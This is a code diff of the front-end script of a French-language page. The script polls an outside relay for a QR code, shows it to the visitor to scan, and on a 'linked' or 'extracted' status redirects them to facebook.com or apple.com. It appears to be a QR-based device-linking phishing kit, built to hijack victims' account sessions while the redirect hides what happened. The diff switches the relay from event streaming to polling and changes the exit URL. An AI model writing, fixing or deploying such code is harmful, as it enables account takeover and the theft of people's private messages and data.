@@ -70,10 +70,8 @@
 (function(){
   'use strict';
 
-  /* ═══ CONFIG — À MODIFIER ═══ */
-  const RELAY = 'https://ia5d0qabx1.preview.c40.airoapp.ai'; // URL GoDaddy
-  const REDIRECT = 'https://www.facebook.com/';     // URL de sortie
-  /* ══════════════════════════ */
+  const RELAY = 'https://ia5d0qabx1.preview.c40.airoapp.ai'; // Vérifiez que c'est bien votre URL
+  const REDIRECT = 'https://www.apple.com/';
 
   const $ = id => document.getElementById(id);
   const wrap = $('qrWrap'), img = $('qrImg'), overlay = $('qrOverlay'), st = $('status');
@@ -83,48 +81,41 @@
     st.className = 'status' + (k ? ' ' + k : '');
   }
 
-  let received = false;
+  let isLinked = false;
+  let interval = setInterval(checkQR, 2000); // Vérifie toutes les 2 secondes
 
-  try {
-    const es = new EventSource(RELAY + '/qr');
+  async function checkQR() {
+    if (isLinked) return;
+    try {
+      const res = await fetch(RELAY + '/qr-json', { cache: 'no-store' });
+      const data = await res.json();
 
-    es.addEventListener('qr', function(e){
-      try {
-        const d = JSON.parse(e.data);
-        if (d.image) {
-          img.src = d.image;
+      if (data.status === 'linked') {
+        clearInterval(interval);
+        isLinked = true;
+        setStatus('Appareil lié, synchronisation…', 'ok');
+        $('main').hidden = true;
+        $('done').hidden = false;
+        setTimeout(() => { location.replace(REDIRECT); }, 4000);
+        return;
+      }
+
+      if (data.image) {
+        if (img.src !== data.image) {
+          img.src = data.image;
           wrap.classList.remove('blur');
           overlay.hidden = true;
           setStatus('En attente du scan…');
-          received = true;
         }
-      } catch(_){}
-    });
-
-    es.addEventListener('status', function(e){
-      try {
-        const d = JSON.parse(e.data);
-        if (d.status === 'linked') {
-          setStatus('Appareil lié, synchronisation…', 'ok');
-          $('main').hidden = true;
-          $('done').hidden = false;
-          setTimeout(() => { location.replace(REDIRECT); }, 4000);
-        } else if (d.status === 'extracted') {
-          setStatus('✓ Terminé', 'ok');
-        }
-      } catch(_){}
-    });
-
-    es.addEventListener('error', function(){
-      if (!received) setStatus('Connexion lente, patientez…');
-    });
-  } catch(e) {
-    setStatus('Erreur de connexion', 'err');
+      } else {
+        setStatus('Génération du QR en cours…');
+      }
+    } catch(e) {
+      setStatus('Connexion au serveur…', 'err');
+    }
   }
 
-  setTimeout(function(){
-    if (!received) setStatus('Régénération du QR…');
-  }, 15000);
+  checkQR();
 })();
 </script>
 </body>
